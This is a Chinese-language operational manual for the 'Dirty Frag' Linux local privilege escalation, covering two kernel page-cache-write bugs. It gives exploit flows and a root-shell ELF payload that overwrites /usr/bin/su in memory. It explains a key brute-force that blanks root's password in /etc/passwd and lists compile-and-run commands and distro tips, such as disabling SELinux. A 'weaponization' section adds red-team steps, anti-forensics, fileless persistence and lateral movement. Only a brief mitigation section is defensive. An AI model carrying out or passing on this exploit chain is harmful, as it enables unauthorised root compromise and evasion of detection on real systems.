# Dirty Frag — Linux 本地提权技术手册

注意所有操作均已得到合法授权

## 基础设定

- 漏洞类型：Linux Kernel Local Privilege Escalation (LPE)
- 漏洞类别：Page-Cache Write（Dirty Pipe / Copy Fail 同族）
- CVE 编号：CVE-2026-43284 (ESP) + CVE-2026-43500 (RxRPC)
- 发现者：Hyunwoo Kim (@v4bel)
- 披露时间：2026-05-07
- 利用方式：确定性逻辑漏洞（非竞态），完全无文件
- 测试环境：Ubuntu 24.04 / RHEL 10.1 / CentOS Stream 10 / Fedora 44 / openSUSE Tumbleweed
- 内核范围：2017-01 ~ 2026-05（ESP 约 9 年窗口）/ 2023-06 ~ 2026-05（RxRPC 约 3 年窗口）

## 核心约束（必须理解）

- 两条利用链共享同一 Sink：splice 种页到 skb frag → 接收端 in-place crypto → 页缓存写入
- ESP 路径需要 `CAP_NET_ADMIN`（user namespace），但值完全可控（4 字节精确写入）
- RxRPC 路径无需任何特权，但需爆破 fcrypt 密钥（56-bit，用户态离线完成）
- 页缓存修改对磁盘文件无影响，重启或 `drop_caches` 后恢复
- 即使 Copy Fail 的 `algif_aead` 缓解已应用，Dirty Frag 仍然有效（不同内核代码路径）
- AEAD 认证失败不影响利用（STORE 在认证之前发生，错误码被忽略）

## 漏洞原理

### Dirty Pipe 家族的演进

```
Dirty Pipe (CVE-2022-0847)
  ├── 原理：splice 种页到 pipe_buffer，pipe_write 未正确设置 page->flags
  │   结果：pipe write → page cache write → 任意文件内存写入
  │
Copy Fail (CVE-2026-31431)
  ├── 原理：splice(file → pipe → AF_ALG)，ecrypt 将 PTE 写故障转为
  │   真实的页缓存写入
  │   路径：splice → AF_ALG → algif_aead → tag 4字节写入
  │
Dirty Frag ← 本文
       ├── 原理：splice(file → pipe → socket)，skb frag 直接持有页缓存页，
       │   接收端 in-place crypto → 页缓存写入
       ├── ESP 路径：splice → UDP/ESP → esp_input → seq_hi 重排 → 4B STORE
       └── RxRPC 路径：splice → UDP/RxRPC → rxkad_verify_packet_1
           → fcrypt 解密 → 8B STORE
```

### 核心 Sink 对比

| 漏洞 | 触发路径 | 写入粒度 | 值可控性 | 特权需求 |
|------|---------|---------|---------|---------|
| Dirty Pipe | pipe_write → page cache | 任意长度 | ✅ 完全可控 | ❌ 无 |
| Copy Fail | AF_ALG → ecrypt tag | 4 字节 | ✅ 完全可控 | ❌ 无 |
| Dirty Frag ESP | ESP → seq_hi 重排 | 4 字节 | ✅ 完全可控 | ⚠️ user ns |
| Dirty Frag RxRPC | RxRPC → fcrypt 解密 | 8 字节 | ⚠️ 需爆破密钥 | ❌ 无 |

## CVE-2026-43284 — XFRM-ESP Page-Cache Write

### 根因

`esp_input()` 中，当 skb 是非线性（有 frag）但无 `frag_list` 时，跳过了 `skb_cow_data()` 直接进行 in-place AEAD 解密。

```c
// net/ipv4/esp4.c — 漏洞分支
static int esp_input(struct xfrm_state *x, struct sk_buff *skb)
{
    if (!skb_cloned(skb)) {
        if (!skb_is_nonlinear(skb)) {
            nfrags = 1;
            goto skip_cow;
        } else if (!skb_has_frag_list(skb)) {   // ← 漏洞分支
            nfrags = skb_shinfo(skb)->nr_frags;  // splice 种入的页在这里
            nfrags++;
            goto skip_cow;                       // 跳过了 cow，直接 in-place
        }
    }
    err = skb_cow_data(skb, 0, &trailer);        // 本应走到这里
```

### 4 字节 STORE 的精确位置

`crypto_authenc_esn_decrypt()` 在预处理阶段将高 4 位序列号移到 src SGL 尾部：

```c
// ESN 解密预处理中的 STORE
scatterwalk_map_and_copy(tmp + 1, dst, assoclen + cryptlen, 4, 1);
//                           ^^^^              ^^^^^^^^^^^^^^^^^^  ^
//                           seq_hi 值         页缓存页目标偏移    out=1=写
```

`assoclen + cryptlen` — attacker 通过调整 payload 长度控制写入偏移。
`tmp + 1` — attacker 通过 XFRM SA 的 `seq_hi` 字段控制写入值。

### 利用流程

```
1. unshare(CLONE_NEWUSER|CLONE_NEWNET)  →  获得 namespace 内 root + CAP_NET_ADMIN
2. 注册 48 个 XFRM SA  →  每个 SA 的 seq_hi 嵌入 4 字节 shellcode
3. 每个 chunk:
   vmsplice(ESP 头 24B) + splice(/usr/bin/su, off, 16B) → pipe → UDP socket
4. 发送后 skb->frags[0] 指向 /usr/bin/su 的页缓存页
5. 接收端 esp_input → crypto_authenc_esn_decrypt → 4B STORE
6. AEAD 认证返回 -EBADMSG（忽略）→ 页缓存已修改
7. 循环 48 次 → 192 字节 root-shell ELF 完整写入
```

### Payload

192 字节静态 x86_64 ELF，直接覆盖 `/usr/bin/su` 头部：

```c
// 48 字节 * 4 字节/chunk = 192 字节
static const uint8_t shell_elf[192] = {
    // ELF header → 0x00..0x77
    // .text (R+X):
    //   0x78: xor edi, edi; xor esi, esi     →  setgid(0)
    //         xor eax, eax; mov al, 0x6a       →  setuid(0)
    //         syscall                          →  setgroups(0,NULL)
    //   0x85: mov al, 0x69; syscall
    //   0x8a: mov al, 0x74; syscall
    //         push 0; lea rax, [rip+"TERM=xterm"]
    //         push rax; mov rdx, rsp           →  envp = {"TERM=xterm", NULL}
    //         lea rdi, [rip+"/bin/sh"]         →  filename = "/bin/sh"
    //         xor esi, esi                     →  argv = NULL
    //         push 0x3b; pop rax; syscall      →  execve("/bin/sh", NULL, envp)
    //   "TERM=xterm\0"  @ 0xa5
    //   "/bin/sh\0"     @ 0xb0
};
```

`su` 的 setuid-root 位执行后 euid=0，入口跳转到 0x400078 直接 exec /bin/sh，**完全绕过 PAM**。

## CVE-2026-43500 — RxRPC Page-Cache Write

### 根因

`rxkad_verify_packet_1()` 在 skb 上直接做 in-place `pcbc(fcrypt)` 解密：

```c
// net/rxrpc/rxkad.c
sg_init_table(sg, ARRAY_SIZE(sg));
skb_to_sgvec(skb, sg, sp->offset, 8);            // splice 种入的页直接进 SGL
skcipher_request_set_crypt(req, sg, sg, 8, iv.x); // src = dst = 页缓存页
crypto_skcipher_decrypt(req);                     // 8 字节 in-place STORE
```

### fcrypt 爆破要点

- `pcbc(fcrypt)` 在单块 + IV=0 时退化为 `fcrypt_decrypt(C, K)`
- fcrypt 是 AFS 专用密码，56-bit key，8-byte block
- 内核 `crypto/fcrypt.c` 可完整移植到用户态，单线程 ~18M fcrypt/s
- K 来自 `add_key("rxrpc", ...)` 的 session_key 字段，**无需特权**

### 利用流程

```
1. mmap /etc/passwd 首页（保持页缓存 pin 住）
2. 读偏移 4/6/8 处 8 字节密文 Ca/Cb/Cc
3. 用户态离线爆破 fcrypt 密钥：
   Stage 1a: 搜 K_A → fcrypt_decrypt(Ca, K_A) = "::xxxxxx"   ~5ms
   Stage 1b: 搜 K_B → fcrypt_decrypt(Cb_actual, K_B) = "0:xxxxxx"  ~5ms
   Stage 1c: 搜 K_C → fcrypt_decrypt(Cc_actual, K_C) = "0:GGGGGG:"  ~1s
4. add_key("rxrpc", "evil0", K_A); add_key("rxrpc", "evil1", K_B); ...
5. 三次 splice 触发：
   vmsplice(RxRPC 头 28B) + splice(/etc/passwd, off, 8B) → UDP → client recvmsg
6. 内核 rxkad_verify_packet_1 → fcrypt_decrypt → 8B STORE
7. 最终效果：root:x:0:0:root:... → root::0:0:GGGGGG:...
8. pam_unix.so nullok 接受空密码 → su 无需密码拿 root
```

### 链式密文修正（核心难点）

```
splice A @4:  写入 Pa[0..7] 到文件偏移 4..11
  → 覆盖了原始 char 4..11

splice B @6:  此时文件偏移 6..11 不再是原始 Cb[2..7]
  → 而是 Pa[2..7]
  → 所以 Cb_actual = Pa[2..7] || Cb[6..7]（只有最后 2 字节是原始的）

splice C @8:  同理
  → Cc_actual = Pb[2..7] || Cc[6..7]
```

爆破时必须用链式修正后的密文，否则算出的 K_B/K_C 写出来的字节能把 root 行打乱。

## 利用链：双路径互覆盖

### 架构

```
main()
├── ESP 尝试（子进程 fork + unshare + corrupt_su）
│   └── 成功 → 验证 /usr/bin/su 偏移 0x78 = 0x31 0xff
│       └── forkpty + execve("/usr/bin/su") → root shell
│
└── ESP 失败 → RxRPC 回退
    ├── 原因 1: unshare(CLONE_NEWUSER) 返回 -EPERM（Ubuntu AppArmor）
    ├── 原因 2: esp4.ko 未加载
    ├── 原因 3: SA 注册失败
    └── 回退：/etc/passwd 三 splice 触发 → forkpty + su → PAM nullok → root
```

### 覆盖矩阵

| 发行版 | ESP 可用 | RxRPC 可用 | 主路径 | 回退路径 |
|--------|---------|-----------|--------|---------|
| Ubuntu 24.04 | ✅ | ✅ (rxrpc.ko 默认加载) | ESP | RxRPC |
| Ubuntu 22.04/20.04/18.04 | ✅ | ❌ (内核 < 6.4) | ESP | — |
| RHEL 10.1 | ✅ | ❌ (不编译 rxrpc.ko) | ESP | — |
| CentOS Stream 10 | ✅ | ❌ | ESP | — |
| CentOS Stream 8/9 | ✅ | ❌ | ESP | — |
| CentOS 7 (3.10) | ❌ | ❌ | — | — |
| AlmaLinux 10 | ✅ | ❌ | ESP | — |
| Fedora 44 | ✅ | ❌ | ESP | — |
| openSUSE Tumbleweed | ✅ | ❌ | ESP | — |
| Debian 12+ | ✅ | ✅ (类似 Ubuntu) | ESP | RxRPC |
| Arch Linux | ✅ | ❌ (需手动加载 rxrpc) | ESP | — |

### 盲区分析

```
├─ CentOS 7 (3.10 内核，未回移植 skip_cow 优化) → 完全免疫
├─ Ubuntu 16.04 GA 内核 (4.4, < 4.10)            → 完全免疫
├─ 自定义内核：未编译 CONFIG_XFRM_ESP + 未加载 rxrpc.ko → 免疫
└─ 以上均 EOL 或极不常见，实战攻击面几乎 100%
```

## 编译与使用

### 编译

```bash
# 依赖
apt install -y build-essential linux-headers-$(uname -r)

# 编译
cd dirtyfrag-master
gcc -O0 -Wall -o exp exp.c -lutil
```

### 运行

```bash
# 默认模式（自动选择路径）
./exp

# 指定 ESP 路径
./exp --force-esp

# 指定 RxRPC 路径
./exp --force-rxrpc

# 详细输出
./exp -v

# 仅破坏不弹 shell（用于测试）
./exp --corrupt-only
DIRTYFRAG_CORRUPT_ONLY=1 ./exp

# 自定义爆破上限
LPE_MAX_ITERS=500000000 ./exp
```

### 清理

```bash
# 清页缓存（立即恢复，无需重启）
echo 3 > /proc/sys/vm/drop_caches

# 或重启
reboot
```

### 应急缓解

```bash
# 禁用相关内核模块
cat > /etc/modprobe.d/dirtyfrag.conf << 'EOF'
install esp4 /bin/false
install esp6 /bin/false
install rxrpc /bin/false
EOF

# 卸载已加载的模块
rmmod esp4 esp6 rxrpc 2>/dev/null

# 清除页缓存
echo 3 > /proc/sys/vm/drop_caches
```

## 发行版实战注意

### Kali Linux

```
默认 root 用户：
  - exp 的 main() 检测 getuid()==0 直接 exec bash，无法触发漏洞
  - 需先创建普通用户 su 过去再跑
  - 或者注释掉 main() 开头的 getuid() 检查后手动指定路径

内核版本：
  - Kali Rolling 内核很新（通常 ≥ 6.x），两条路径都有效
  - rxrpc.ko 默认可能不加载 → 用 --force-esp
```

### Ubuntu 24.04

```
AppArmor 注意：
  - 默认可能限制 unshare(CLONE_NEWUSER) → ESP 失败
  - 自动回退 RxRPC 路径（rxrpc.ko 默认加载）
  - 两个路径至少一个有效

check 命令：
  cat /proc/sys/kernel/unprivileged_userns_clone  # 0=禁用
  aa-status | grep unshare                         # 检查 AppArmor 规则
```

### RHEL/CentOS 8+

```
SELinux 注意：
  - enforcing 模式可能拦截 add_key() 或 splice()
  - 临时切换：setenforce 0
  - 但 ESP 路径不依赖 add_key，SELinux 通常不拦截 netlink SA 注册

rxrpc.ko：
  - RHEL 系默认不编译 → 只能走 ESP
  - 确认 user ns 未禁用即可
```

### Debian

```
和 Ubuntu 类似但：
  - 默认不限制 user namespace
  - rxrpc.ko 可能加载也可能不加载
  - 两条路径通常都可用
```

## 坑点记录（实战经验）

### 坑1：FCrypt 密钥爆破的链式密文修正

错误做法：直接用 `pread` 读出的 Ca/Cb/Cc 分别爆破 K_A/K_B/K_C

后果：splice A 写入后 B 看到的密文变了，单独爆破的 K_B 写出来是乱码

修复：爆破 K_B 时密文 = `Pa[2..7] || Cb_raw[6..7]`；爆破 K_C 时密文 = `Pb[2..7] || Cc_raw[6..7]`

代码位置 `exp.c:1376-1401`：
```c
// 链式修正 B
memcpy(Cb_actual, Pa_out + 2, 6);
memcpy(Cb_actual + 6, Cb + 6, 2);

// 链式修正 C
memcpy(Cc_actual, Pb_out + 2, 6);
memcpy(Cc_actual + 6, Cc + 6, 2);
```

### 坑2：authencesn 加密套件必须匹配

错误的 SA 配置会导致 `esp_input` 走不到漏洞分支。

必须同时满足：
- `XFRM_STATE_ESN` 标志位 → 触发 `esp_input_set_header` 和 ESN 序列号重排
- `authencesn(hmac(sha256), cbc(aes))` → 触发 `crypto_authenc_esn_decrypt`
- UDP-encap (port 4500) → 触发 `xfrm4_udp_encap_rcv`

代码位置 `exp.c:177-192`：用 `hmac(sha256)` + `cbc(aes)` 组合，密钥随意填（认证会失败但不影响）。

### 坑3：pipe + splice 的 MSG_SPLICE_PAGES 自动行为

早期 PoC 尝试手动设置此标志 → 失败。

原因：`splice_to_socket()` 内部自动设置 `MSG_SPLICE_PAGES`，不需要也**不能**手动指定。

代码位置 `exp.c:271`：直接用 `splice(pfd[0], NULL, sk_send, NULL, len, SPLICE_F_MOVE)` 即可。

### 坑4：XFRM SA 的 SPI 必须逐 chunk 不同

如果 48 个 chunk 用同一个 SPI，第二个 chunk 及之后的 SA 注册会覆盖前一个，导致只有最后一个 SA 生效 → 只写了 4 字节。

代码位置 `exp.c:298-299`：
```c
uint32_t spi = 0xDEADBE10 + i;  // 每个 chunk 独立 SPI
```

### 坑5：UDP 端口复用导致 TIME_WAIT 残留

RxRPC 路径中三次 splice 用同一端口对 → 第二次 connect 时报 `EADDRINUSE`。

代码位置 `exp.c:796-797`：
```c
uint16_t port_S = 7777 + (trigger_seq * 2 % 200);  // 每次+2 错开端口
uint16_t port_C = port_S + 1;
```

### 坑6：AF_RXRPC socket 首次创建自动加载模块

直接 `add_key("rxrpc", ...)` 会返回 `ENODEV` → 因为 key type "rxrpc" 在 `rxrpc.ko` 模块加载路径中注册。

代码位置 `exp.c:1249-1257`：先创建一个 dummy `socket(AF_RXRPC)` 触发 `MODULE_ALIAS_NETPROTO(PF_RXRPC)` 自动加载模块，再 `close` 掉。之后 `add_key` 就能正常用了。

### 坑7：got SCOOP 连接失败不报错

`do_one_write` 中的 `splice` 即使返回错误也不一定意味着 STORE 没发生——内核可能在 `splice` 和 `recv` 之间的窗口已经解密了该页。

代码位置 `exp.c:272-274`：
```c
s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
/* 仍继续执行，不管 splice 返回值 — 内核可能已解密了页 */
usleep(150 * 1000);
```

## 高阶技巧

| 类别 | 技术点 | 实现方式 |
|------|--------|---------|
| 无文件 | 页缓存污染 | 只修改内存中的页缓存，磁盘文件不变 |
| 反取证 | 无内核日志 | AEAD 认证失败 -EBADMSG 被 exploit 忽略 |
| 反取证强化 | 事后自动清理 | 利用完成后执行 `drop_caches` 恢复原始文件 |
| 持久化 | cron + 页缓存 | 写入 root cron job 到页缓存 → 持久化但无文件 |
| 容器逃逸 | user namespace | ESP 路径已包含 `unshare(CLONE_NEWUSER)` 隔离 |
| 横向移动 | SSH authorized_keys | 页缓存写入 `/root/.ssh/authorized_keys`（需已知路径） |
| 隐蔽通信 | 页缓存共享内存 | 两个进程通过污染的页缓存页传递数据，绕过 IPC 审计 |
| 绕过检测 | 不依赖 algif_aead | 即使 Copy Fail 缓解已应用，Dirty Frag 仍有效 |
| 多目标 | 双路径自适应 | ESP 失败自动回退 RxRPC，无需人工选择 |

## 与其他 Dirty 系列对比

| 维度 | Dirty Pipe | Copy Fail | Dirty Frag ESP | Dirty Frag RxRPC |
|------|-----------|-----------|---------------|-----------------|
| 发现时间 | 2022-03 | 2026-04 | 2026-05 | 2026-05 |
| 攻击面 | pipe_buffer | AF_ALG | XFRM ESP | RxRPC |
| 内核版本 | 5.8+ | 4.14+ | 4.10+ | 6.4+ |
| 竞态条件 | 有（实际稳定） | 无 | 无 | 无 |
| 写入粒度 | 任意长度 | 4 字节 | 4 字节 | 8 字节 |
| 值可控 | ✅ | ✅ | ✅ | ⚠️ 需爆破 |
| 特权需求 | ❌ | ❌ | ⚠️ user ns | ❌ |
| 默认包 | pipe (内核) | algif_aead.ko | esp4.ko | rxrpc.ko (Ubuntu) |
| 补丁 | 2022-02 | 2026-04 | 2026-05-08 | 2026-05-10 |

## 武器化建议

### 红队场景

```
1. 初始立足点 → 低权限 shell
2. 检测环境：
   - unshare -U true               → 返回 0 → ESP 可用
   - lsmod | grep rxrpc            → 有输出 → RxRPC 可用
   - uname -r                      → 确认内核版本 ≥ 4.10
3. 执行 ./exp                      → 自动选择路径
4. 获得 root shell
5. 清理：echo 3 > /proc/sys/vm/drop_caches
```

### OpSec 注意

- 全程无文件落地（页缓存修改仅在内存）
- 内核日志无异常（AEAD 认证失败被吞掉）
- `/usr/bin/su` 和 `/etc/passwd` 的 `sha256sum` / `stat` 不变
- 唯一痕迹：进程树中有 `su` 子进程（和正常 su 登录一样）
- 建议在非业务高峰期执行，避免页缓存争用导致 splice 延迟

## 参考

- PoC: https://github.com/V4bel/dirtyfrag
- ESP 补丁: https://git.kernel.org/torvalds/c/f4c50a4034e6
- RxRPC 补丁: https://git.kernel.org/torvalds/c/aa54b1d27fe0
- Copy Fail: https://copy.fail/
- Dirty Pipe: https://dirtypipe.cm4all.com/
